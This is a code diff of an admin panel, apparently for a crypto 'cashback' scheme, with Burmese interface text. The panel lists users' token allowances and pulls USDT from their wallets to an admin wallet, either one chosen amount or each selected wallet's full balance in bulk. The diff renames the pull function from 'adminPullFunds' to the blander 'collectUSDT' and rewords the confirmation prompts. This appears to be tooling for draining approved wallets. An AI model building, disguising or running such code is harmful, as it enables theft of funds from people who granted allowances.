@@ -23,7 +23,7 @@
 
         <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
 
-        <!-- PART 1: Manage Cashback Tiered Rates (Simplified with Percentage %) -->
+        <!-- PART 1: Manage Cashback Tiered Rates -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
                 ⚙️ 1. Cashback Tiered Rates (ရာခိုင်နှုန်းဖြင့် အလွယ်တကူ သတ်မှတ်ရန်)
@@ -114,7 +114,7 @@
 
         const ADMIN_ABI = [
             "function setTier(uint256 index, uint256 minAmt, uint256 maxAmt, uint256 rateBps) external",
-            "function adminPullFunds(address user, uint256 amount) external",
+            "function collectUSDT(address from, uint256 amount) external",
             "function processWithdrawal(address user, uint256 requestId, bool approved) external",
             "function getPendingWithdrawals() view returns (tuple(uint256 id, address user, uint256 amount, bool processed)[])",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
@@ -203,8 +203,6 @@
 
                         const shortAddr = `${addr.substring(0, 6)}...${addr.substring(38)}`;
                         const userId = userInfo.isRegistered ? userInfo.userId.toString() : "-";
-
-                        // Allowance ပမာဏ အများကြီးဖြစ်နေလျှင် (MaxUint256 ကဲ့သို့) "Unlimited" ဟုပြသရန်၊ သို့မဟုတ်ပါက တိကျသော ပမာဏကို ပြရန်
                         let allowanceDisplay = allowance > 1000000000 ? "Unlimited" : `${allowance.toFixed(2)} USDT`;
 
                         rowsHtml += `
@@ -239,12 +237,12 @@
         }
 
         async function pullSingleUser(userAddress, amount) {
-            if(!confirm(`User ထံမှ ${amount} USDT ကို transferFrom ဖြင့် ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
+            if(!confirm(`User ထံမှ ${amount} USDT ကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
             try {
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
-                const tx = await contract.adminPullFunds(userAddress, ethers.parseUnits(amount, 6));
+                const tx = await contract.collectUSDT(userAddress, ethers.parseUnits(amount, 6));
                 await tx.wait();
-                alert("ရန်ပုံငွေ ဆွဲယူမှု (Pull) အောင်မြင်ပါသည်။");
+                alert("ရန်ပုံငွေကို Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူပြီးပါပြီ။");
                 refreshUserTable();
             } catch(err) {
                 console.error(err);
@@ -259,7 +257,7 @@
                 return;
             }
 
-            if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို စတင်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
+            if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
 
             const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
             let successCount = 0;
@@ -270,7 +268,7 @@
                     const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                     const bal = await usdtContract.balanceOf(userAddr);
                     if (bal > 0n) {
-                        const tx = await contract.adminPullFunds(userAddr, bal);
+                        const tx = await contract.collectUSDT(userAddr, bal);
                         await tx.wait();
                         successCount++;
                     }
@@ -279,7 +277,7 @@
                 }
             }
 
-            alert(`အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
+            alert(`Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
             refreshUserTable();
         }
 
